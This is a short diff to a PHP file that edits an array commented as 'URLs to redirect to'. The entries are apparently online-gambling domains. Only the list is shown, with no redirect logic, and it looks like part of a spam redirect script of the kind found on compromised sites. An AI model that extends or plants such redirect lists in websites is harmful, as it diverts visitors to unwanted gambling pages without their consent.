@@ -1,10 +1,10 @@
 <?php
 // Array of URLs to redirect to
 $urls = [
-    'https://sateslotgacor.xyz',
-    'https://megaforwinbet.online',
+    'https://sateslotgacor.info',
     'https://nasgorbetkecap.pro',
     'https://nagaforwinapi.xyz',
+    'https://megaforwinbet.online',
     'https://burungbetsip.fun',
     // Add more URLs here
 ];
